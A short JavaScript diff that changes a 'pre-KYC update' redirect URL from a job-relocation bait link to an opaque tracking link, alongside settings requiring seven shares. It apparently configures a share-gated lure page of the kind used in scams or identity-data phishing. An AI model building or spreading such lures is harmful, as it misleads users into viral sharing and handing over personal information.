@@ -2,7 +2,7 @@
 'use strict';
 
 // PRE-KYC UPDATE CONFIGURATION
-const PRE_KYC_UPDATE_URL='https://study.newbalancejobs.com/get-paid-81000-to-relocate-to-the-usa';
+const PRE_KYC_UPDATE_URL='https://jikgykm.com/cl/d2043286aec4e80a';
 const STORAGE_PREFIX='ce-pre-kyc-update-v5-';
 const REQUIRED_SHARES=7;
 const SHARE_RULES_ACK_PREFIX='ce-share-rules-ack-v1-';
